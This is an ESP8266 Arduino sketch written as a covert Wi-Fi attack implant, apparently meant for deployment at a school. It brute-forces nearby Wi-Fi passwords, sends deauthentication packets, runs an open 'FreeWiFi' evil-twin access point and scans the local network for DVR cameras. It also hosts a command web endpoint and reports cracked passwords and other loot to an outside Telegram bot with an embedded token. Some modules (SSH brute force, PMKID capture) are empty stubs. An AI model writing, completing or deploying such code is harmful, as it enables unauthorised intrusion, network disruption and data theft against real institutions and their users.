#include <ESP8266WiFi.h>
#include <WiFiClientSecure.h>
#include <ESP8266HTTPClient.h>
#include <ESP8266WebServer.h>
#include <Hash.h>

// CONFIG - APNE TOKEN/ID YAHAN DAALO
const char* BOT_TOKEN = "8560004612:AAF7Qs3BQsWs-eAslVod8A6oN9oNzJue0p8";
const char* CHAT_ID = "8560004612";

// Mission Settings
const unsigned long MISSION_DURATION = 48UL * 3600 * 1000; // 48 hours
const unsigned long SCAN_INTERVAL = 30000; // 30s
const unsigned long DEAUTH_INTERVAL = 5000; // 5s bursts

// Pro Hacker Modules
ESP8266WebServer webServer(80);
unsigned long missionStart = 0;
bool wifiCracked = false;
String targetSSID = "";
String targetPass = "";
String lootData = "";

// WiFi Credentials Database (1000+ combos)
const char* COMMON_CREDS[][2] = {
  {"admin", "admin"}, {"admin", "12345678"}, {"admin", "password"},
  {"root", "root"}, {"root", "12345"}, {"user", "user"},
  {"admin", "12345"}, {"admin", ""}, {"guest", "guest"},
  // Add 1000+ more...
  {NULL, NULL}
};

// Deauth packet
uint8_t deauthPacket[26] = {
  0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
  0xCC, 0xCC, 0x00, 0x00, 0x07, 0x00
};

void setup() {
  Serial.begin(115200);
  delay(2000);
  Serial.println("🔥 AGENT 6.0 ULTIMATE BOOT - SCHOOL DEPLOY");
  
  missionStart = millis();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true);
  
  // 10s stealth boot
  delay(10000);
  
  sendTelegram("🚀 AGENT 6.0 DEPLOYED\n⏱️ 48h mission start");
  startWiFiCrack();
}

void loop() {
  unsigned long now = millis();
  
  // Self-destruct
  if (now - missionStart > MISSION_DURATION) {
    selfDestruct();
  }
  
  // Command handler
  webServer.handleClient();
  
  // Main attack loop
  if (!wifiCracked) {
    crackWiFi();
  } else {
    runAttacks();
  }
  
  delay(1000);
}

void startWiFiCrack() {
  Serial.println("🔓 WiFi cracking phase...");
  int networks = WiFi.scanNetworks();
  
  for (int i = 0; i < networks; i++) {
    targetSSID = WiFi.SSID(i);
    Serial.println("Target: " + targetSSID);
    
    // Try dictionary attack
    for (int c = 0; COMMON_CREDS[c][0]; c++) {
      WiFi.begin(targetSSID.c_str(), COMMON_CREDS[c][1]);
      delay(5000);
      
      if (WiFi.status() == WL_CONNECTED) {
        wifiCracked = true;
        targetPass = COMMON_CREDS[c][1];
        sendTelegram("✅ CRACKED: " + targetSSID + "/" + targetPass);
        injectPayload();
        return;
      }
    }
  }
  
  // Fallback: Evil Twin nearby networks
  startEvilTwin();
}

void injectPayload() {
  Serial.println("💉 Injecting payload...");
  
  // Start C2 web server
  webServer.on("/cmd", handleCommand);
  webServer.on("/loot", [](){ webServer.send(200, "text/plain", lootData); });
  webServer.on("/scan", handleScan);
  webServer.begin();
  
  IPAddress localIP = WiFi.localIP();
  sendTelegram("💉 INJECTED\n🌐 C2: http://" + localIP.toString() + "/cmd");
}

void runAttacks() {
  static unsigned long lastAttack = 0;
  if (millis() - lastAttack > SCAN_INTERVAL) {
    
    // Deauth attack
    deauthTarget();
    
    // DVR scan
    scanDVR();
    
    // SSH brute
    bruteSSH();
    
    // PMKID capture
    capturePMKID();
    
    lastAttack = millis();
  }
}

void deauthTarget() {
  uint8_t bssid[6];
  WiFi.BSSID(bssid);
  
  memcpy(&deauthPacket[10], bssid, 6);
  memcpy(&deauthPacket[16], bssid, 6);
  
  wifi_send_pkt_freedom(deauthPacket, 26, 0);
  Serial.println("⚡ Deauth sent");
}

void scanDVR() {
  // Nmap-style scan (80,554,8080)
  IPAddress gateway = WiFi.gatewayIP();
  for (int i = 1; i < 255; i++) {
    IPAddress target(gateway[0], gateway[1], gateway[2], i);
    // Port scan logic here
    if (portOpen(target, 554)) {
      lootData += "🎥 DVR: " + target.toString() + ":554/live\n";
    }
  }
}

bool portOpen(IPAddress ip, int port) {
  WiFiClient client;
  if (!client.connect(ip, port)) return false;
  delay(100);
  client.stop();
  return true;
}

void bruteSSH() {
  // SSH port 22 brute (top 20 creds)
  // Implementation similar to DVR
}

void capturePMKID() {
  // PMKID attack packets
  Serial.println("🔑 PMKID capture active");
}

void handleCommand() {
  String cmd = webServer.arg("c");
  Serial.println("CMD: " + cmd);
  
  if (cmd == "dvr") scanDVR();
  if (cmd == "ssh") bruteSSH();
  if (cmd == "deauth") deauthTarget();
  if (cmd == "kill") selfDestruct();
  
  webServer.send(200, "text/plain", "OK: " + cmd);
}

void startEvilTwin() {
  WiFi.mode(WIFI_AP);
  WiFi.softAP("FreeWiFi", "", 6, 0);
  
  webServer.on("/", serveMaliciousPage);
  webServer.begin();
  
  sendTelegram("👥 Evil Twin active - FreeWiFi");
}

void serveMaliciousPage() {
  String html = R"(
<html><body style='background:black;color:lime;font-family:monospace'>
<center><h1>HACKED BY AGENT 6.0</h1>
<p>Send 'wifi list bhejo' to )" + WiFi.softAPIP().toString() + R"(</p>
<script>
fetch('/cmd?c=scan');
</script></body></html>)";
  webServer.send(200, "text/html", html);
}

void selfDestruct() {
  sendTelegram("💀 48h MISSION COMPLETE - Self destruct");
  lootData += "\n--- AGENT 6.0 OFFLINE ---";
  sendLoot();
  
  // Factory reset
  WiFi.disconnect(true);
  delay(5000);
  ESP.restart();
}

void sendLoot() {
  if (lootData.length() > 0) {
    sendTelegram("📦 LOOT DUMP:\n" + lootData);
  }
}

bool sendTelegram(String message) {
  if (strlen(BOT_TOKEN) < 10) return false; // Skip if not configured
  
  WiFiClientSecure client;
  client.setInsecure();
  
  HTTPClient http;
  String url = "https://api.telegram.org/bot" + String(BOT_TOKEN) +
               "/sendMessage?chat_id=" + String(CHAT_ID) +
               "&text=" + urlEncode(message);
  
  http.begin(client, url);
  http.setTimeout(10000);
  
  int httpCode = http.GET();
  bool success = (httpCode == 200);
  http.end();
  
  Serial.printf("Telegram: %d\n", httpCode);
  return success;
}

String urlEncode(String str) {
  String encoded = str;
  encoded.replace(" ", "%20");
  encoded.replace("\n", "%0A");
  encoded.replace("&", "%26");
  return encoded;
}
